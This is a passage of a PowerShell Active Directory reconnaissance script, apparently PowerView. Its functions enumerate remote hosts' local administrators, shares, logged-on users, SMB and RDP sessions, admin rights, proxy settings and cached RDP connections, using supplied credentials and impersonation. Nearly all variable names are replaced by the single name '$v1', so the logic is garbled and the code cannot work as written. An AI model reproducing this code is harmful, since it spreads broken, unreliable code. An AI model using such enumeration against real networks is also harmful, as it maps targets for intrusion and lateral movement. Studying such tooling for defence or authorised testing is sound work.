                        $v1 | Add-Member Noteproperty 'ObjectDN' $v1.distinguishedname
                        $v1 | Add-Member Noteproperty 'ObjectSID' $v1
                        $v1 | Add-Member Noteproperty 'IsGroup' $v1
                        $v1 | Add-Member Noteproperty 'GPODisplayName' $v1.GPODisplayName
                        $v1 | Add-Member Noteproperty 'GPOGuid' $v1.GPOName
                        $v1 | Add-Member Noteproperty 'GPOPath' $v1.GPOPath
                        $v1 | Add-Member Noteproperty 'GPOType' $v1.GPOType
                        $v1.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
                        $v1
                    }
                }
            }
        }
    }
}


function Get-DomainPolicyData {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('Source', 'Name')]
        [String]
        $v1 = 'Domain',

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @{}
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        $v1 = @{}
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
    }

    PROCESS {
        if ($v1['Domain']) {
            $v1['Domain'] = $v1
            $v1['Domain'] = $v1
        }

        if ($v1 -eq 'All') {
            $v1['Identity'] = '*'
        }
        elseif ($v1 -eq 'Domain') {
            $v1['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif (($v1 -eq 'DomainController') -or ($v1 -eq 'DC')) {
            $v1['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            $v1['Identity'] = $v1
        }

        $v1 = Get-DomainGPO @SearcherArguments

        ForEach ($v1 in $v1) {

            $v1 = $v1.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            $v1 =  @{
                'GptTmplPath' = $v1
                'OutputObject' = $v1
            }
            if ($v1['Credential']) { $v1['Credential'] = $v1 }


            Get-GptTmpl @ParseArgs | ForEach-Object {
                $v1 | Add-Member Noteproperty 'GPOName' $v1.name
                $v1 | Add-Member Noteproperty 'GPODisplayName' $v1.displayname
                $v1
            }
        }
    }
}










function Get-NetLocalGroup {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1 = $v1:COMPUTERNAME,

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $v1 = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($v1['Credential']) {
            $v1 = Invoke-UserImpersonation -Credential $v1
        }
    }

    PROCESS {
        ForEach ($v1 in $v1) {
            if ($v1 -eq 'API') {



                $v1 = 1
                $v1 = [IntPtr]::Zero
                $v1 = 0
                $v1 = 0
                $v1 = 0


                $v1 = $v1::NetLocalGroupEnum($v1, $v1, [ref]$v1, -1, [ref]$v1, [ref]$v1, [ref]$v1)


                $v1 = $v1.ToInt64()


                if (($v1 -eq 0) -and ($v1 -gt 0)) {


                    $v1 = $v1::GetSize()


                    for ($v1 = 0; ($v1 -lt $v1); $v1++) {

                        $v1 = New-Object System.Intptr -ArgumentList $v1
                        $v1 = $v1 -as $v1

                        $v1 = $v1.ToInt64()
                        $v1 += $v1

                        $v1 = New-Object PSObject
                        $v1 | Add-Member Noteproperty 'ComputerName' $v1
                        $v1 | Add-Member Noteproperty 'GroupName' $v1.lgrpi1_name
                        $v1 | Add-Member Noteproperty 'Comment' $v1.lgrpi1_comment
                        $v1.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                        $v1
                    }

                    $v1 = $v1::NetApiBufferFree($v1)
                }
                else {
                    Write-Verbose "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $v1).Message)"
                }
            }
            else {

                $v1 = [ADSI]"WinNT://$v1,computer"

                $v1.psbase.children | Where-Object { $v1.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                    $v1 = ([ADSI]$v1)
                    $v1 = New-Object PSObject
                    $v1 | Add-Member Noteproperty 'ComputerName' $v1
                    $v1 | Add-Member Noteproperty 'GroupName' ($v1.InvokeGet('Name'))
                    $v1 | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($v1.InvokeGet('objectsid'),0)).Value)
                    $v1 | Add-Member Noteproperty 'Comment' ($v1.InvokeGet('Description'))
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                    $v1
                }
            }
        }
    }

    END {
        if ($v1) {
            Invoke-RevertToSelf -TokenHandle $v1
        }
    }
}


function Get-NetLocalGroupMember {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1 = $v1:COMPUTERNAME,

        [Parameter(ValueFromPipelineByPropertyName = $v1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1 = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $v1 = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($v1['Credential']) {
            $v1 = Invoke-UserImpersonation -Credential $v1
        }
    }

    PROCESS {
        ForEach ($v1 in $v1) {
            if ($v1 -eq 'API') {



                $v1 = 2
                $v1 = [IntPtr]::Zero
                $v1 = 0
                $v1 = 0
                $v1 = 0


                $v1 = $v1::NetLocalGroupGetMembers($v1, $v1, $v1, [ref]$v1, -1, [ref]$v1, [ref]$v1, [ref]$v1)


                $v1 = $v1.ToInt64()

                $v1 = @()


                if (($v1 -eq 0) -and ($v1 -gt 0)) {


                    $v1 = $v1::GetSize()


                    for ($v1 = 0; ($v1 -lt $v1); $v1++) {

                        $v1 = New-Object System.Intptr -ArgumentList $v1
                        $v1 = $v1 -as $v1

                        $v1 = $v1.ToInt64()
                        $v1 += $v1

                        $v1 = ''
                        $v1 = $v1::ConvertSidToStringSid($v1.lgrmi2_sid, [ref]$v1);$v1 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($v1 -eq 0) {
                            Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $v1).Message)"
                        }
                        else {
                            $v1 = New-Object PSObject
                            $v1 | Add-Member Noteproperty 'ComputerName' $v1
                            $v1 | Add-Member Noteproperty 'GroupName' $v1
                            $v1 | Add-Member Noteproperty 'MemberName' $v1.lgrmi2_domainandname
                            $v1 | Add-Member Noteproperty 'SID' $v1
                            $v1 = $($v1.lgrmi2_sidusage -eq 'SidTypeGroup')
                            $v1 | Add-Member Noteproperty 'IsGroup' $v1
                            $v1.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
                            $v1 += $v1
                        }
                    }


                    $v1 = $v1::NetApiBufferFree($v1)


                    $v1 = $v1 | Where-Object {$v1.SID -match '.*-500' -or ($v1.SID -match '.*-501')} | Select-Object -Expand SID
                    if ($v1) {
                        $v1 = $v1.Substring(0, $v1.LastIndexOf('-'))

                        $v1 | ForEach-Object {
                            if ($v1.SID -match $v1) {
                                $v1 | Add-Member Noteproperty 'IsDomain' $v1
                            }
                            else {
                                $v1 | Add-Member Noteproperty 'IsDomain' $v1
                            }
                        }
                    }
                    else {
                        $v1 | ForEach-Object {
                            if ($v1.SID -notmatch 'S-1-5-21') {
                                $v1 | Add-Member Noteproperty 'IsDomain' $v1
                            }
                            else {
                                $v1 | Add-Member Noteproperty 'IsDomain' 'UNKNOWN'
                            }
                        }
                    }
                    $v1
                }
                else {
                    Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $v1).Message)"
                }
            }
            else {

                try {
                    $v1 = [ADSI]"WinNT://$v1/$v1,group"

                    $v1.psbase.Invoke('Members') | ForEach-Object {

                        $v1 = New-Object PSObject
                        $v1 | Add-Member Noteproperty 'ComputerName' $v1
                        $v1 | Add-Member Noteproperty 'GroupName' $v1

                        $v1 = ([ADSI]$v1)
                        $v1 = $v1.InvokeGet('AdsPath').Replace('WinNT://', '')
                        $v1 = ($v1.SchemaClassName -like 'group')

                        if(([regex]::Matches($v1, '/')).count -eq 1) {

                            $v1 = $v1
                            $v1 = $v1.Replace('/', '\')
                        }
                        else {

                            $v1 = $v1
                            $v1 = $v1.Substring($v1.IndexOf('/')+1).Replace('/', '\')
                        }

                        $v1 | Add-Member Noteproperty 'AccountName' $v1
                        $v1 | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($v1.InvokeGet('ObjectSID'),0)).Value)
                        $v1 | Add-Member Noteproperty 'IsGroup' $v1
                        $v1 | Add-Member Noteproperty 'IsDomain' $v1

















































                        $v1
                    }
                }
                catch {
                    Write-Verbose "[Get-NetLocalGroupMember] Error for $v1 : $v1"
                }
            }
        }
    }

    END {
        if ($v1) {
            Invoke-RevertToSelf -TokenHandle $v1
        }
    }
}


function Get-NetShare {

    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($v1['Credential']) {
            $v1 = Invoke-UserImpersonation -Credential $v1
        }
    }

    PROCESS {
        ForEach ($v1 in $v1) {

            $v1 = 1
            $v1 = [IntPtr]::Zero
            $v1 = 0
            $v1 = 0
            $v1 = 0


            $v1 = $v1::NetShareEnum($v1, $v1, [ref]$v1, -1, [ref]$v1, [ref]$v1, [ref]$v1)


            $v1 = $v1.ToInt64()


            if (($v1 -eq 0) -and ($v1 -gt 0)) {


                $v1 = $v1::GetSize()


                for ($v1 = 0; ($v1 -lt $v1); $v1++) {

                    $v1 = New-Object System.Intptr -ArgumentList $v1
                    $v1 = $v1 -as $v1


                    $v1 = $v1 | Select-Object *
                    $v1 | Add-Member Noteproperty 'ComputerName' $v1
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
                    $v1 = $v1.ToInt64()
                    $v1 += $v1
                    $v1
                }


                $v1 = $v1::NetApiBufferFree($v1)
            }
            else {
                Write-Verbose "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $v1).Message)"
            }
        }
    }

    END {
        if ($v1) {
            Invoke-RevertToSelf -TokenHandle $v1
        }
    }
}


function Get-NetLoggedon {

    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($v1['Credential']) {
            $v1 = Invoke-UserImpersonation -Credential $v1
        }
    }

    PROCESS {
        ForEach ($v1 in $v1) {

            $v1 = 1
            $v1 = [IntPtr]::Zero
            $v1 = 0
            $v1 = 0
            $v1 = 0


            $v1 = $v1::NetWkstaUserEnum($v1, $v1, [ref]$v1, -1, [ref]$v1, [ref]$v1, [ref]$v1)


            $v1 = $v1.ToInt64()


            if (($v1 -eq 0) -and ($v1 -gt 0)) {


                $v1 = $v1::GetSize()


                for ($v1 = 0; ($v1 -lt $v1); $v1++) {

                    $v1 = New-Object System.Intptr -ArgumentList $v1
                    $v1 = $v1 -as $v1


                    $v1 = $v1 | Select-Object *
                    $v1 | Add-Member Noteproperty 'ComputerName' $v1
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
                    $v1 = $v1.ToInt64()
                    $v1 += $v1
                    $v1
                }


                $v1 = $v1::NetApiBufferFree($v1)
            }
            else {
                Write-Verbose "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $v1).Message)"
            }
        }
    }

    END {
        if ($v1) {
            Invoke-RevertToSelf -TokenHandle $v1
        }
    }
}


function Get-NetSession {

    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($v1['Credential']) {
            $v1 = Invoke-UserImpersonation -Credential $v1
        }
    }

    PROCESS {
        ForEach ($v1 in $v1) {

            $v1 = 10
            $v1 = [IntPtr]::Zero
            $v1 = 0
            $v1 = 0
            $v1 = 0


            $v1 = $v1::NetSessionEnum($v1, '', $v1, $v1, [ref]$v1, -1, [ref]$v1, [ref]$v1, [ref]$v1)


            $v1 = $v1.ToInt64()


            if (($v1 -eq 0) -and ($v1 -gt 0)) {


                $v1 = $v1::GetSize()


                for ($v1 = 0; ($v1 -lt $v1); $v1++) {

                    $v1 = New-Object System.Intptr -ArgumentList $v1
                    $v1 = $v1 -as $v1


                    $v1 = $v1 | Select-Object *
                    $v1 | Add-Member Noteproperty 'ComputerName' $v1
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
                    $v1 = $v1.ToInt64()
                    $v1 += $v1
                    $v1
                }


                $v1 = $v1::NetApiBufferFree($v1)
            }
            else {
                Write-Verbose "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $v1).Message)"
            }
        }
    }


    END {
        if ($v1) {
            Invoke-RevertToSelf -TokenHandle $v1
        }
    }
}


function Get-RegLoggedOn {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1 = 'localhost'
    )

    BEGIN {
        if ($v1['Credential']) {
            $v1 = Invoke-UserImpersonation -Credential $v1
        }
    }

    PROCESS {
        ForEach ($v1 in $v1) {
            try {

                $v1 = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$v1")


                $v1.GetSubKeyNames() | Where-Object { $v1 -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
                    $v1 = ConvertFrom-SID -ObjectSID $v1 -OutputType 'DomainSimple'

                    if ($v1) {
                        $v1, $v1 = $v1.Split('@')
                    }
                    else {
                        $v1 = $v1
                        $v1 = $v1
                    }

                    $v1 = New-Object PSObject
                    $v1 | Add-Member Noteproperty 'ComputerName' "$v1"
                    $v1 | Add-Member Noteproperty 'UserDomain' $v1
                    $v1 | Add-Member Noteproperty 'UserName' $v1
                    $v1 | Add-Member Noteproperty 'UserSID' $v1
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
                    $v1
                }
            }
            catch {
                Write-Verbose "[Get-RegLoggedOn] Error opening remote registry on '$v1' : $v1"
            }
        }
    }

    END {
        if ($v1) {
            Invoke-RevertToSelf -TokenHandle $v1
        }
    }
}


function Get-NetRDPSession {

    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($v1['Credential']) {
            $v1 = Invoke-UserImpersonation -Credential $v1
        }
    }

    PROCESS {
        ForEach ($v1 in $v1) {


            $v1 = $v1::WTSOpenServerEx($v1)


            if ($v1 -ne 0) {


                $v1 = [IntPtr]::Zero
                $v1 = 0


                $v1 = $v1::WTSEnumerateSessionsEx($v1, [ref]1, 0, [ref]$v1, [ref]$v1);$v1 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()


                $v1 = $v1.ToInt64()

                if (($v1 -ne 0) -and ($v1 -gt 0)) {


                    $v1 = $v1::GetSize()


                    for ($v1 = 0; ($v1 -lt $v1); $v1++) {


                        $v1 = New-Object System.Intptr -ArgumentList $v1
                        $v1 = $v1 -as $v1

                        $v1 = New-Object PSObject

                        if ($v1.pHostName) {
                            $v1 | Add-Member Noteproperty 'ComputerName' $v1.pHostName
                        }
                        else {

                            $v1 | Add-Member Noteproperty 'ComputerName' $v1
                        }

                        $v1 | Add-Member Noteproperty 'SessionName' $v1.pSessionName

                        if ($(-not $v1.pDomainName) -or ($v1.pDomainName -eq '')) {

                            $v1 | Add-Member Noteproperty 'UserName' "$($v1.pUserName)"
                        }
                        else {
                            $v1 | Add-Member Noteproperty 'UserName' "$($v1.pDomainName)\$($v1.pUserName)"
                        }

                        $v1 | Add-Member Noteproperty 'ID' $v1.SessionID
                        $v1 | Add-Member Noteproperty 'State' $v1.State

                        $v1 = [IntPtr]::Zero
                        $v1 = 0



                        $v1 = $v1::WTSQuerySessionInformation($v1, $v1.SessionID, 14, [ref]$v1, [ref]$v1);$v1 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($v1 -eq 0) {
                            Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $v1).Message)"
                        }
                        else {
                            $v1 = $v1.ToInt64()
                            $v1 = New-Object System.Intptr -ArgumentList $v1
                            $v1 = $v1 -as $v1

                            $v1 = $v1.Address
                            if ($v1[2] -ne 0) {
                                $v1 = [String]$v1[2]+'.'+[String]$v1[3]+'.'+[String]$v1[4]+'.'+[String]$v1[5]
                            }
                            else {
                                $v1 = $v1
                            }

                            $v1 | Add-Member Noteproperty 'SourceIP' $v1
                            $v1.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
                            $v1


                            $v1 = $v1::WTSFreeMemory($v1)

                            $v1 += $v1
                        }
                    }

                    $v1 = $v1::WTSFreeMemoryEx(2, $v1, $v1)
                }
                else {
                    Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $v1).Message)"
                }

                $v1 = $v1::WTSCloseServer($v1)
            }
            else {
                Write-Verbose "[Get-NetRDPSession] Error opening the Remote Desktop Session Host (RD Session Host) server for: $v1"
            }
        }
    }

    END {
        if ($v1) {
            Invoke-RevertToSelf -TokenHandle $v1
        }
    }
}


function Test-AdminAccess {

    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($v1['Credential']) {
            $v1 = Invoke-UserImpersonation -Credential $v1
        }
    }

    PROCESS {
        ForEach ($v1 in $v1) {


            $v1 = $v1::OpenSCManagerW("\\$v1", 'ServicesActive', 0xF003F);$v1 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            $v1 = New-Object PSObject
            $v1 | Add-Member Noteproperty 'ComputerName' $v1


            if ($v1 -ne 0) {
                $v1 = $v1::CloseServiceHandle($v1)
                $v1 | Add-Member Noteproperty 'IsAdmin' $v1
            }
            else {
                Write-Verbose "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $v1).Message)"
                $v1 | Add-Member Noteproperty 'IsAdmin' $v1
            }
            $v1.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
            $v1
        }
    }

    END {
        if ($v1) {
            Invoke-RevertToSelf -TokenHandle $v1
        }
    }
}


function Get-NetComputerSiteName {

    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($v1['Credential']) {
            $v1 = Invoke-UserImpersonation -Credential $v1
        }
    }

    PROCESS {
        ForEach ($v1 in $v1) {

            if ($v1 -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                $v1 = $v1
                $v1 = [System.Net.Dns]::GetHostByAddress($v1) | Select-Object -ExpandProperty HostName
            }
            else {
                $v1 = @(Resolve-IPAddress -ComputerName $v1)[0].IPAddress
            }

            $v1 = [IntPtr]::Zero

            $v1 = $v1::DsGetSiteName($v1, [ref]$v1)

            $v1 = New-Object PSObject
            $v1 | Add-Member Noteproperty 'ComputerName' $v1
            $v1 | Add-Member Noteproperty 'IPAddress' $v1

            if ($v1 -eq 0) {
                $v1 = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($v1)
                $v1 | Add-Member Noteproperty 'SiteName' $v1
            }
            else {
                Write-Verbose "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $v1).Message)"
                $v1 | Add-Member Noteproperty 'SiteName' ''
            }
            $v1.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')


            $v1 = $v1::NetApiBufferFree($v1)

            $v1
        }
    }

    END {
        if ($v1) {
            Invoke-RevertToSelf -TokenHandle $v1
        }
    }
}


function Get-WMIRegProxy {

    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1 = $v1:COMPUTERNAME,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($v1 in $v1) {
            try {
                $v1 = @{
                    'List' = $v1
                    'Class' = 'StdRegProv'
                    'Namespace' = 'root\default'
                    'Computername' = $v1
                    'ErrorAction' = 'Stop'
                }
                if ($v1['Credential']) { $v1['Credential'] = $v1 }

                $v1 = Get-WmiObject @WmiArguments
                $v1 = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'


                $v1 = 2147483649
                $v1 = $v1.GetStringValue($v1, $v1, 'ProxyServer').sValue
                $v1 = $v1.GetStringValue($v1, $v1, 'AutoConfigURL').sValue

                $v1 = ''
                if ($v1 -and ($v1 -ne '')) {
                    try {
                        $v1 = (New-Object Net.WebClient).DownloadString($v1)
                    }
                    catch {
                        Write-Warning "[Get-WMIRegProxy] Error connecting to AutoConfigURL : $v1"
                    }
                }

                if ($v1 -or $v1) {
                    $v1 = New-Object PSObject
                    $v1 | Add-Member Noteproperty 'ComputerName' $v1
                    $v1 | Add-Member Noteproperty 'ProxyServer' $v1
                    $v1 | Add-Member Noteproperty 'AutoConfigURL' $v1
                    $v1 | Add-Member Noteproperty 'Wpad' $v1
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')
                    $v1
                }
                else {
                    Write-Warning "[Get-WMIRegProxy] No proxy settings found for $v1"
                }
            }
            catch {
                Write-Warning "[Get-WMIRegProxy] Error enumerating proxy settings for $v1 : $v1"
            }
        }
    }
}


function Get-WMIRegLastLoggedOn {

    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($v1 in $v1) {

            $v1 = 2147483650

            $v1 = @{
                'List' = $v1
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $v1
                'ErrorAction' = 'SilentlyContinue'
            }
            if ($v1['Credential']) { $v1['Credential'] = $v1 }


            try {
                $v1 = Get-WmiObject @WmiArguments

                $v1 = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
                $v1 = 'LastLoggedOnUser'
                $v1 = $v1.GetStringValue($v1, $v1, $v1).sValue

                $v1 = New-Object PSObject
                $v1 | Add-Member Noteproperty 'ComputerName' $v1
                $v1 | Add-Member Noteproperty 'LastLoggedOn' $v1
                $v1.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
                $v1
            }
            catch {
                Write-Warning "[Get-WMIRegLastLoggedOn] Error opening remote registry on $v1. Remote registry likely not enabled."
            }
        }
    }
}


function Get-WMIRegCachedRDPConnection {

    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($v1 in $v1) {

            $v1 = 2147483651

            $v1 = @{
                'List' = $v1
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $v1
                'ErrorAction' = 'Stop'
            }
            if ($v1['Credential']) { $v1['Credential'] = $v1 }

            try {
                $v1 = Get-WmiObject @WmiArguments


                $v1 = ($v1.EnumKey($v1, '')).sNames | Where-Object { $v1 -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach ($v1 in $v1) {
                    try {
                        if ($v1['Credential']) {
                            $v1 = ConvertFrom-SID -ObjectSid $v1 -Credential $v1
                        }
                        else {
                            $v1 = ConvertFrom-SID -ObjectSid $v1
                        }


                        $v1 = $v1.EnumValues($v1,"$v1\Software\Microsoft\Terminal Server Client\Default").sNames

                        ForEach ($v1 in $v1) {

                            if ($v1 -match 'MRU.*') {
                                $v1 = $v1.GetStringValue($v1, "$v1\Software\Microsoft\Terminal Server Client\Default", $v1).sValue

                                $v1 = New-Object PSObject
                                $v1 | Add-Member Noteproperty 'ComputerName' $v1
                                $v1 | Add-Member Noteproperty 'UserName' $v1
                                $v1 | Add-Member Noteproperty 'UserSID' $v1
                                $v1 | Add-Member Noteproperty 'TargetServer' $v1
                                $v1 | Add-Member Noteproperty 'UsernameHint' $v1
                                $v1.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                                $v1
                            }
                        }


                        $v1 = $v1.EnumKey($v1,"$v1\Software\Microsoft\Terminal Server Client\Servers").sNames

                        ForEach ($v1 in $v1) {

                            $v1 = $v1.GetStringValue($v1, "$v1\Software\Microsoft\Terminal Server Client\Servers\$v1", 'UsernameHint').sValue

                            $v1 = New-Object PSObject
                            $v1 | Add-Member Noteproperty 'ComputerName' $v1
                            $v1 | Add-Member Noteproperty 'UserName' $v1
                            $v1 | Add-Member Noteproperty 'UserSID' $v1
                            $v1 | Add-Member Noteproperty 'TargetServer' $v1
                            $v1 | Add-Member Noteproperty 'UsernameHint' $v1
                            $v1.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                            $v1
                        }
                    }
                    catch {
                        Write-Verbose "[Get-WMIRegCachedRDPConnection] Error: $v1"
                    }
                }
            }
            catch {
                Write-Warning "[Get-WMIRegCachedRDPConnection] Error accessing $v1, likely insufficient permissions or firewall rules on host: $v1"
            }
        }
    }
}


function Get-WMIRegMountedDrive {

    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($v1 in $v1) {

            $v1 = 2147483651

            $v1 = @{
                'List' = $v1
